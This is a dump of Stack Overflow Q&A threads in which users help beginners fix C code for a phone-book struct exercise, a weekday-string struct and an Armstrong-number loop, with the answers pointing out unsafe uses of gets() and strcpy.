"comment_id": 96793847, "body": "When an array is passed to a function, it decays to a pointer to its <i>first element</i>. The pointer you have in the function is a pointer to <code>s[0]</code>. You can access it through the usual array indexing like <code>p[0]</code> for the first element, <code>p[1]</code> for the second, etc."}], "answers": [{"comments": [{"owner": {"reputation": 55, "user_id": 11158412, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-RwnCUrojbX8/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdZUyWIEQQCUlyX3bNXyLArhBAGlw/mo/photo.jpg?sz=128", "display_name": "ProximanovaMetropolis", "link": "https://stackoverflow.com/users/11158412/proximanovametropolis"}, "edited": false, "score": 0, "creation_date": 1551869842, "post_id": 55020091, "comment_id": 96796200, "body": "I don\u2019t know how you use scanf() in an if statement, so could you explain what that does? If scanf == 1, what happens? (Though I\u2019m not familiar with %19s either, I can understand what that means: you can\u2019t enter more than 19 characters.)"}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 55, "user_id": 11158412, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-RwnCUrojbX8/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdZUyWIEQQCUlyX3bNXyLArhBAGlw/mo/photo.jpg?sz=128", "display_name": "ProximanovaMetropolis", "link": "https://stackoverflow.com/users/11158412/proximanovametropolis"}, "edited": false, "score": 0, "creation_date": 1551871609, "post_id": 55020091, "comment_id": 96797237, "body": "@Celcomtel <i>scanf</i> returns the number of read element, in the current case there is 1 element to read (a string), this is why he compares to 1. <i>scanf(&quot;%19s&quot;, ..)</i> allows to read a maximum of 19 chars, adding the final null char on the max case 20 chars are written, allowing to not go out of <i>name</i> and <i>telno</i>. Do <i>man scanf</i> or look on internet for more. You can look also at my answer, I use a different way to do."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 3, "last_activity_date": 1551866286, "last_edit_date": 1551866286, "creation_date": 1551865949, "answer_id": 55020091, "question_id": 55018643, "link": "https://stackoverflow.com/questions/55018643/using-strcmp-in-structures-passed-as-pointers/55020091#55020091", "title": "Using strcmp() in structures passed as pointers", "body": "<p>The program template is not well structured and gives a very bad example by using obsolete and dangerous function <code>gets()</code>.</p>\n\n<p>It would be much better to pass <code>readin()</code> the number of structures in the array pointed to by the <code>p</code> argument. From the code template, we must assume that <code>MAX</code> structures are accessible through <code>p</code>.</p>\n\n<p>The <code>readin</code> function should read up to <code>MAX</code> entries from standard input and stores the into the corresponding elements of the destination array, using an index or incrementing <code>p</code>.</p>\n\n<p>Here is a solution with an index:</p>\n\n<pre><code>int readin(PhoneBk *p) {\n    int i, n = MAX;\n    for (i = 0; i &lt; n; i++) {\n        printf(\"Enter person name, # to stop.\\n\");\n        if (scanf(\"%19s\", p[i].name) != 1 || p[i].name[0] == '#')\n            return i;\n        printf(\"Enter the telephone number.\\n\");\n        if (scanf(\"%19s\", p[i].telno) != 1)\n            return i;\n    }\n    return i;\n}\n</code></pre>\n\n<p>Simlarly, the search function can iterate through the array from <code>0</code> to <code>size</code> excluded:</p>\n\n<pre><code>void search(PhoneBk *p, int size, char *target) {\n    int i, found = 0;\n    for (i = 0; i &lt; size; i++) {\n        if (!strcmp(p[i].name, target) {\n            printf(\"Name = %s, Tel. = %s\\n\", p[i].name, p[i].telno);\n            found++;\n        }\n    }\n    if (found == 0)\n        printf(\"Name not found.\\n\");\n}\n</code></pre>\n\n<p>Regarding the warnings, you have a typo on <code>strcmp((char)p-&gt;name, \"#\")</code>, the cast is unnecessary and in this case converts the pointer to a single <code>char</code>, causing 2 warnings: one for converting a pointer to an integer of a different size and another one for passing an integer to <code>strcmp()</code> instead of a pointer to <code>char</code>.</p>\n"}, {"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1551888254, "post_id": 55020855, "comment_id": 96807407, "body": "Hello @bruno! There is a small problem with your approach: <code>fgets()</code> will read the newline into the destination array, so the maximum length of the input fields will be reduced by 1 byte. If the user enters 19 characters before the newline, the newline will not be read and the next call to <code>fgets()</code> will read the pending newline and return immediately. <code>scanf(&quot;%19s&quot;,...)</code> has the same problem, but for names longer than 19 characters."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1551888655, "post_id": 55020855, "comment_id": 96807646, "body": "Also another problem: the argument to <code>isspace()</code> should not have type <code>char</code> because on architectures where <code>char</code> is signed by default, negative characters will cause undefined behavior. You should write <code>isspace((unsigned char)s[p2])</code>."}, {"owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1551889200, "post_id": 55020855, "comment_id": 96807985, "body": "Hello @chqrlie (as usual) you are right. About <i>isspace</i> I supposed in my head it gets a <i>char</i> but it get an <i>int</i>, so yes the sign counts, this is a <i>very</i> strange choice of the lib (no comparison with EOF). I edit my answer thank you again (and I hope you had a nice previous week, and I UV your answer some hours ago ^^)"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1551889919, "post_id": 55020855, "comment_id": 96808436, "body": "Yes, it is a <i>strange</i> API: <code>isspace()</code> and friends can be passed any <code>int</code> value returned from <code>getc()</code>. <code>EOF</code> is OK and gives a 0 return value. The real problem is not this API, it is the fact that many compilers make <code>char</code> signed by default for compatibility with legacy code at the expense of consistency. I always instruct the compiler to make <code>char</code> unsigned by default (<code>-funsigned-char</code> for gcc and clang), but it is sadly not the default behavior. I am sure many programs can be broken by providing input with well chosen 8-bit characters."}], "tags": [], "owner": {"reputation": 31685, "user_id": 2458991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WWDzI.jpg?s=128&g=1", "display_name": "bruno", "link": "https://stackoverflow.com/users/2458991/bruno"}, "is_accepted": false, "score": 2, "last_activity_date": 1551889312, "last_edit_date": 1551889312, "creation_date": 1551868066, "answer_id": 55020855, "question_id": 55018643, "link": "https://stackoverflow.com/questions/55018643/using-strcmp-in-structures-passed-as-pointers/55020855#55020855", "title": "Using strcmp() in structures passed as pointers", "body": "<p>In <em>readin</em> you do not test the last entered name but the name (not initialized) of the next entry, and you do not also check you reach the end of the phone book, nor the EOF case. Note you also suppose the name is a just a word and cannot contain spaces, but because the <em>main</em> uses the (ugly) <em>gets</em> may be composed names are allowed.</p>\n\n<p>To not be perturbed by extra spaces it seems needed to remove them.</p>\n\n<p>For instance:</p>\n\n<pre><code>#include &lt;ctype.h&gt;\n\nvoid normalize(char * s)\n{\n  /* remove unexpected 'isspace' */\n  int p1 = 0, p2 = 0;\n\n  while (s[p2] != 0) {\n    if (!isspace((unsigned char) s[p2]))\n      s[p1++] = s[p2];\n    else if ((p1 != 0) &amp;&amp; (s[p1 - 1] != ' '))\n      s[p1++] = ' ';\n    p2 += 1;\n  }\n\n  s[((p1 != 0) &amp;&amp; (s[p1 - 1] == ' ')) ? p1 - 1 : p1] = 0;\n}\n\nint readin(PhoneBk *p)\n{\n  int n;\n\n  for (n = 0; n != MAX; ++n) {\n    puts(\"Enter person name, max length 18, # to stop.\");\n    if (fgets(p-&gt;name, sizeof(p-&gt;name), stdin) == NULL) {\n      /* EOF */\n      return n;\n    }\n    normalize(p-&gt;name);\n    if (p-&gt;name[0] == '#')\n      break;\n\n    printf(\"Enter the telephone number, max length 18\\n\");\n    if (fgets(p-&gt;telno, sizeof(p-&gt;telno), stdin) == NULL) {\n      /* EOF, forget partial entry */\n      return n;\n    }\n    normalize(p-&gt;telno);\n\n    p += 1;\n  }\n\n  return n;\n}\n</code></pre>\n\n<p>Your <em>search</em> is so complicated I preferred to not try to understand it, sorry, the definition can be very simple :</p>\n\n<pre><code>void search(PhoneBk *p, int size, char *target)\n{\n  normalize(target);\n\n  while (size--) {\n    if (!strcmp(p-&gt;name, target)) {\n      printf(\"%s found, phone number is %s\\n\", target, p-&gt;telno);\n      return;\n    }\n    p += 1;\n  }\n\n  printf(\"unknown name %s\\n\", target);\n}\n</code></pre>\n\n<p>Note I also normalize the read name, to be compatible with the read of the book.</p>\n\n<p>If I try without changing the given <em>main</em> and its ugly <em>gets</em>, compilation and executions :</p>\n\n<pre><code>/tmp % gcc -g -pedantic -Wextra c.c\n/tmp/ccdXFM1o.o: In function `main':\n/tmp/c.c:17: warning: the `gets' function is dangerous and should not be used.\n/tmp % ./a.out\nEnter person name, max length 18, # to stop.\n john     do\nEnter the telephone number, max length 18\n12   34 56\nEnter person name, max length 18, # to stop.\njust me\nEnter the telephone number, max length 18\n1 2 3 4 5\nEnter person name, max length 18, # to stop.\n#\nEnter search name: \njohn  do\njohn do found, phone number is 12 34 56\n/tmp % \n/tmp % ./a.out\nEnter person name, max length 18, # to stop.\n john     do\nEnter the telephone number, max length 18\n12   34 56\nEnter person name, max length 18, # to stop.\njust me\nEnter the telephone number, max length 18\n1 2 3 4 5\nEnter person name, max length 18, # to stop.\n#\nEnter search name: \njust        me\njust me found, phone number is 1 2 3 4 5\n/tmp % \n/tmp % ./a.out\nEnter person name, max length 18, # to stop.\n john     do\nEnter the telephone number, max length 18\n12   34 56\nEnter person name, max length 18, # to stop.\njust me\nEnter the telephone number, max length 18\n1 2 3 4 5\nEnter person name, max length 18, # to stop.\n#\nEnter search name: \nme  \nunknown name me\n</code></pre>\n"}], "owner": {"reputation": 55, "user_id": 11158412, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-RwnCUrojbX8/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdZUyWIEQQCUlyX3bNXyLArhBAGlw/mo/photo.jpg?sz=128", "display_name": "ProximanovaMetropolis", "link": "https://stackoverflow.com/users/11158412/proximanovametropolis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 458, "favorite_count": 0, "accepted_answer_id": 55020091, "answer_count": 2, "score": 3, "last_activity_date": 1551889312, "creation_date": 1551861088, "last_edit_date": 1551869566, "question_id": 55018643, "link": "https://stackoverflow.com/questions/55018643/using-strcmp-in-structures-passed-as-pointers", "title": "Using strcmp() in structures passed as pointers", "body": "<p>I have a bunch of practice questions in Structures, <strong>all</strong> of which involve structures passed as pointers to function arguments. Now, I have a specific question at hand, which asks me to store some names and telephone numbers in a phone book structure. It reads as follows:</p>\n\n<blockquote>\n  <p>Write a C program that implements the following two functions. The function <code>readin()</code> reads a number of\n      persons\u2019 names and their corresponding telephone numbers, passes the data to the caller\n      via the parameter <code>p</code>, and returns the number of names that have entered. The character <code>#</code> is used\n      to indicate the end of user input. The function <code>search()</code> finds the telephone number of an input name\n      target, and then prints the name and telephone number on the screen. If the input name cannot be\n      found, then it will print an appropriate error message. The prototypes of the two functions are given below:</p>\n</blockquote>\n\n<pre><code> int readin(PhoneBk *p);\n void search(PhoneBk *p, int size, char *target);\n</code></pre>\n\n<p>The structure definition for <code>PhoneBk</code> is given below:</p>\n\n<pre><code>typedef struct {\n    char name[20];\n    char telno[20];\n} PhoneBk;\n</code></pre>\n\n<p>The program template is as follows:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define MAX 100\n\ntypedef struct {\n    char name[20];\n    char telno[20];\n} PhoneBk;\n\nint readin(PhoneBk *p);\nvoid search(PhoneBk *p, int size, char *target); \n\nint main() {\n    PhoneBk s[MAX];\n    char t[20];\n    int size;\n\n    size = readin(s);\n    printf(\"Enter search name: \\n\");\n\n    gets(t);\n    search(s, size, t);\n\n    return 0;\n}\n\nint readin(PhoneBk *p) {\n    /* Write your program code here */\n}\n\nvoid search(PhoneBk *p, int size, char *target) {\n    /* Write your program code here */ \n}\n</code></pre>\n\n<p>I'll have to compare strings twice in my program: one, to check if <code>#</code> is entered as the name (in which case I'd like the program to jump straight to the search function without asking the phone number); and two, if the targeted name matches that in one of the phone book structures.</p>\n\n<p>Now I am completely alien to the concept of structures being declared as arrays but passed as pointers, so I <strong>think</strong> the way to get the user input for the next record is by incrementing the pointer variable (here <code>p</code>). For the get-the-records-until-#-is-entered function, I wrote this (using <code>strcmp</code>):</p>\n\n<pre><code>int readin(PhoneBk *p) {\n    strcpy(p-&gt;name, \"Test\");    //To guarantee a character that is not #.\n    while (strcmp(p-&gt;name, \"#\") != 0) {\n        printf(\"Enter person name, # to stop.\\n\");\n        scanf(\"%s\", p-&gt;name);\n        printf(\"Enter the telephone number.\\n\");\n        scanf(\"%s\", p-&gt;telno);\n        p++;\n    }\n    return p;\n}\n</code></pre>\n\n<p>My intention is to typecast <code>p-&gt;name</code> as a string so that <code>strcmp()</code> can work on it. But a warning is repeatedly shown:</p>\n\n<pre><code>warning: cast from pointer to integer of different size\nwarning: passing argument 1 of strcmp() makes pointer from integer without a cast\n</code></pre>\n\n<p>This error has been discussed many times on the forums (I searched), but nothing that I've seen really helps with this combination of structures and <code>strcmp()</code>.</p>\n\n<p>I gave up on <code>strcmp()</code> entirely for the second function, the one that displays the record of a person if the targeted name is found, and so I used a loop to compare the strings directly.</p>\n\n<pre><code>void search(PhoneBk *p, int size, char *target) {\n    int i, flag = 1, strCompare;\n    char c1 = *(p-&gt;name), c2 = *target, p1 = p-&gt;name, p2 = target;\n    while (c1 != '\\0' &amp;&amp; c2 != '\\0') {  //Comparing strings.\n        strCompare = (int)(c1 - c2);\n        if (strCompare != 0)\n            break;\n        else {\n            p1++;\n            p2++;\n        }\n    }\n    for (i = 0; i &lt; size; i++, p++) {\n        if (strCompare == 0) {\n            flag = 0;\n            printf(\"Name = %s, Tel. = %s\\n\", p-&gt;name, p-&gt;telno);\n        }\n        if (flag == 1)\n            printf(\"Name not found.\\n\");\n    }\n}\n</code></pre>\n\n<p>But again I get a number of warnings.</p>\n\n<pre><code>warning: cast from pointer to integer of different size\nwarning: initialization makes pointer from integer without a cast\n</code></pre>\n\n<p>I really think my life would be easier if the structures were all passed as arrays, in which case I could simply iterate through the array of structures using a For loop and be done with it. This is what I've always done throughout high school, but now that I'm in university, I am forced to deal with structures passed as pointers.</p>\n\n<p>How do I handle <code>strcmp()</code> in this case? How can this be applied to any program with structures passed as pointers?</p>\n"}, {"tags": ["c", "arrays", "structure"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1551860733, "post_id": 55018490, "comment_id": 96790686, "body": "<code>strcpy(mon.day[0],&quot;Sunday&quot;);</code> --- problem!!"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1551860739, "post_id": 55018490, "comment_id": 96790690, "body": "The compiler should be shouting warnings at you. What is e.g. <code>mon.day[2]</code>? Is it really a <i>string</i> (which can be used as a destination for <code>strcpy</code>), or a <i>single character</i> (like you print it)?"}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1551860747, "post_id": 55018490, "comment_id": 96790697, "body": "<code>printf(&quot;Day %d is %c\\n&quot;,i+1,mon.day[i]);     }</code> =&gt; <code>printf(&quot;Day %d is %s\\n&quot;,i+1,mon.day);     }</code>"}, {"owner": {"reputation": 189, "user_id": 6493576, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/y7Hzl.png?s=128&g=1", "display_name": "Crutch Master", "link": "https://stackoverflow.com/users/6493576/crutch-master"}, "edited": false, "score": 2, "creation_date": 1551860816, "post_id": 55018490, "comment_id": 96790738, "body": "char day[7] - it is 7 chars. Not 7 strings, not 7 char pointers, nothing else. Just 7 chars (bytes). Also you do overflow everything in strcpy."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1551860891, "post_id": 55018490, "comment_id": 96790782, "body": "Unrelated to your problem, but please read e.g. <a href=\"https://en.cppreference.com/w/c/language/main_function\" rel=\"nofollow noreferrer\">this <code>main</code> function reference</a>. Your declaration of <code>main</code> is invalid."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1551860903, "post_id": 55018490, "comment_id": 96790788, "body": "@Someprogrammerdude wrong format changed. Mobile comment"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551979898, "post_id": 55018490, "comment_id": 96849373, "body": "the posted code has LOTS of undefined behavior.  starting with: the field &#39;day[]&#39; is only 7 characters long and every string has a trailing NUL byte, so none of the strings: <code>Sunday</code> through <code>Saturday</code> will fit into that 7 characters.  The result of each call to <code>strcpy()</code> will always overflow the buffer, resulting in undefined behavior"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551980026, "post_id": 55018490, "comment_id": 96849434, "body": "OT: regarding:  <code>{   int i;</code>  It is poor programming practice to have more that one statement per line.  (always consider a opening brace &#39;{&#39; as the end of a statement)"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551980130, "post_id": 55018490, "comment_id": 96849489, "body": "OT: the <code>date[12]</code> field is never used, so why have it?"}], "answers": [{"tags": [], "owner": {"reputation": 16436, "user_id": 10411602, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b534549770aedbc4d7eb03a39d740f6?s=128&d=identicon&r=PG&f=1", "display_name": "Blaze", "link": "https://stackoverflow.com/users/10411602/blaze"}, "is_accepted": false, "score": 4, "last_activity_date": 1551860706, "creation_date": 1551860706, "answer_id": 55018545, "question_id": 55018490, "link": "https://stackoverflow.com/questions/55018490/how-to-print-the-days-of-the-week-using-a-structure-member/55018545#55018545", "title": "How to print the days of the week using a structure member?", "body": "<p>You are trying to store strings in <code>char</code>. However, a string is an array of <code>char</code>. Instead of this: </p>\n\n<pre><code>char day[7];\n</code></pre>\n\n<p>You need something such as:</p>\n\n<pre><code>char day[7][16];\n</code></pre>\n\n<p>Now you have 16 <code>char</code> to fit in a weekday, and you have that seven times, one for each day. Also, your print is wrong. To print strings, you need <code>%s</code>, not <code>%c</code>. <code>%c</code> is just for one single char:</p>\n\n<pre><code>printf(\"Day %d is %s\\n\", i + 1, mon.day[i]);\n</code></pre>\n\n<hr>\n\n<p>Another way of doing it is to have an array of <code>char*</code> instead of <code>char</code> and only storing the address of the strings rather than copying the strings:</p>\n\n<pre><code>char *day[7];\n</code></pre>\n\n<p>Then store the addresses like this:</p>\n\n<pre><code>mon.day[0] = \"Sunday\";\nmon.day[1] = \"Monday\";\nmon.day[2] = \"Tuesday\";\n...\n</code></pre>\n\n<p>And print it the same way, with <code>%s</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 2, "last_activity_date": 1551861021, "creation_date": 1551861021, "answer_id": 55018628, "question_id": 55018490, "link": "https://stackoverflow.com/questions/55018490/how-to-print-the-days-of-the-week-using-a-structure-member/55018628#55018628", "title": "How to print the days of the week using a structure member?", "body": "<p>If you try to compile your program, your compiler will give you certain warnings. Like</p>\n\n<ul>\n<li><p><strong>Problem 1:</strong></p>\n\n<pre><code>source_file.c:10:1: warning: return type defaults to \u2018int\u2019 [-Wimplicit-int]\n main()\n ^\n</code></pre>\n\n<p>The proper signature of <code>main()</code> is <code>int main(void)</code>, for usual hosted environments.</p></li>\n<li><p><strong>Problem 2:</strong></p>\n\n<pre><code>source_file.c: In function \u2018main\u2019:\nsource_file.c:13:5: warning: implicit declaration of function \u2018strcpy\u2019 [-Wimplicit-function-declaration]\n     strcpy(mon.day[0],\"Sunday\");\n     ^\nsource_file.c:13:5: warning: incompatible implicit declaration of built-in function \u2018strcpy\u2019\nsource_file.c:13:5: note: include \u2018&lt;string.h&gt;\u2019 or provide a declaration of \u2018strcpy\u2019\n</code></pre>\n\n<p>You'd need to include <code>string.h</code> header file which contains the declaration for <code>strcpy()</code>.</p></li>\n<li><p><strong>Problem 3:</strong></p>\n\n<pre><code>source_file.c:13:12: warning: passing argument 1 of \u2018strcpy\u2019 makes pointer from integer without a cast [-Wint-conversion]\n     strcpy(mon.day[0],\"Sunday\");\n</code></pre>\n\n<p>This indicates, the first argument of <code>strcpy()</code> expects a <code>char *</code>, but you're passing a <code>char</code>, casted to an <code>int</code>.</p>\n\n<p>This is the most important point here, as you'd see, you need to pass a <em>buffer</em> which can contain the content from the copied string. Thu's, you'd need </p></li>\n<li><p><code>day</code> to be a 2-D array</p></li>\n<li>use <code>day[i]</code> to store the content</li>\n<li>use <code>%s</code> to print the content thereof.</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 351, "user_id": 10443813, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0ee2ae00e0a906599c69e0e698035d0?s=128&d=identicon&r=PG&f=1", "display_name": "KL-Yang", "link": "https://stackoverflow.com/users/10443813/kl-yang"}, "is_accepted": false, "score": 0, "last_activity_date": 1551862399, "creation_date": 1551862399, "answer_id": 55018994, "question_id": 55018490, "link": "https://stackoverflow.com/questions/55018490/how-to-print-the-days-of-the-week-using-a-structure-member/55018994#55018994", "title": "How to print the days of the week using a structure member?", "body": "<p>For constants like day and month, better constructed like the following, unless you are practicing with struct.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main()\n{   \n    const char *day[] = {\"Sunday\", \"Monday\", \"Tuesday\",\"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\" };\n              //^^^^^ array of strings.\n    for(int i=0;i&lt;7;i++)\n        printf(\"Day %d is %s\\n\",i+1,day[i]);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 11146261, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-_y4m2Jo-5Kg/AAAAAAAAAAI/AAAAAAAAACQ/WIfNylq4deI/photo.jpg?sz=128", "display_name": "Chanchhunneng chrea", "link": "https://stackoverflow.com/users/11146261/chanchhunneng-chrea"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 271, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1551862399, "creation_date": 1551860479, "last_edit_date": 1551861319, "question_id": 55018490, "link": "https://stackoverflow.com/questions/55018490/how-to-print-the-days-of-the-week-using-a-structure-member", "title": "How to print the days of the week using a structure member?", "body": "<p>I want to print the days of the week in this program but it doesn't work, what can I do to fix it ?</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nstruct month{\n    int date[12];\n    char day[7];\n}mon;\nmain()\n{   int i;\n\n    strcpy(mon.day[0],\"Sunday\");\n    strcpy(mon.day[1],\"Monday\");\n    strcpy(mon.day[2],\"Tuesday\");\n    strcpy(mon.day[3],\"Wednesday\");\n    strcpy(mon.day[4],\"Thursday\");\n    strcpy(mon.day[5],\"Friday\");\n    strcpy(mon.day[6],\"Saturday\");\n\n    for(i=0;i&lt;7;i++)\n    {\n        printf(\"Day %d is %c\\n\",i+1,mon.day[i]);\n    }\n\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1551859779, "post_id": 55018293, "comment_id": 96790194, "body": "<code>result</code> is not reset, is one thing. <code>int</code> might be too small, <code>pow</code> is vulnerable too. Time for you to get your debugger out."}, {"owner": {"reputation": 1705, "user_id": 6834831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BfjAm.jpg?s=128&g=1", "display_name": "ALFA", "link": "https://stackoverflow.com/users/6834831/alfa"}, "edited": false, "score": 0, "creation_date": 1551860006, "post_id": 55018293, "comment_id": 96790302, "body": "Same for <code>n</code>, it&#39;s not being reset at the end of the loop. Still not the real problem since <code>371</code> is a Armstrong number and it&#39;s not being output. Try debug line by line and see where it fails and why <code>if(result==i)</code> is not true"}], "answers": [{"tags": [], "owner": {"reputation": 716, "user_id": 6507170, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EdjYE.png?s=128&g=1", "display_name": "priojeet priyom", "link": "https://stackoverflow.com/users/6507170/priojeet-priyom"}, "is_accepted": false, "score": 0, "last_activity_date": 1551860208, "creation_date": 1551860208, "answer_id": 55018411, "question_id": 55018293, "link": "https://stackoverflow.com/questions/55018293/to-print-amstrong-no-from-100-to-10000-in-c/55018411#55018411", "title": "to print amstrong no from 100 to 10000 in c", "body": "<p>You were not resetting the value of n and result. Both were summing up for each iteration, thus providing wrong output. Also, check for the range.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;math.h&gt;\nvoid main()\n{\n    int orignal,rem,no,result=0,n=0,i;\n    printf(\"Amstrong no from 100 to 10000 are\\n\");\n    for(i=100;i&lt;=1000;i++) //153 is a armstrong number!\n    {\n        result=0, n=0; //have to reset for each number\n        orignal=i;\n        while(orignal!=0)\n        {\n            orignal/=10;\n            ++n;\n        }\n        orignal=i;\n        while(orignal!=0)\n        {\n            rem=orignal%10;\n            result+=pow(rem,n);\n            orignal/=10;\n        }\n        if(result==i)\n            printf(\"%d\\n\",i);\n\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1705, "user_id": 6834831, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BfjAm.jpg?s=128&g=1", "display_name": "ALFA", "link": "https://stackoverflow.com/users/6834831/alfa"}, "is_accepted": false, "score": 0, "last_activity_date": 1551860247, "creation_date": 1551860247, "answer_id": 55018428, "question_id": 55018293, "link": "https://stackoverflow.com/questions/55018293/to-print-amstrong-no-from-100-to-10000-in-c/55018428#55018428", "title": "to print amstrong no from 100 to 10000 in c", "body": "<p>So I tried to run your code and I got this output:</p>\n\n<pre><code>Amstrong no from 100 to 10000 are\nv\nv\nv\n371\n</code></pre>\n\n<p>So <code>371</code> is being output. The problem is that variable <code>n</code> and <code>result</code> must be resetted at the end of the loop, so you have:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;math.h&gt;\nvoid main()\n{\n    int orignal,rem,no,result=0,n=0,i;\n    printf(\"Amstrong no from 100 to 10000 are\\nv\\nv\\nv\\n\");\n    for(i=371;i&lt;=1000;i++)\n    {\n        orignal=i;\n        while(orignal!=0)\n        {\n            orignal/=10;\n            ++n;\n        }\n        orignal=i;\n        while(orignal!=0)\n        {\n            rem=orignal%10;\n            result+=pow(rem,n);\n            orignal/=10;\n        }\n        if(result==i)\n            printf(\"%d\\n\",i);\n\n        n=0;\n        result = 0;\n    }\n}\n</code></pre>\n\n<p>And the final output, which is also the correct one is:</p>\n\n<pre><code>Amstrong no from 100 to 10000 are\nv\nv\nv\n371\n407\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 11158324, "user_type": 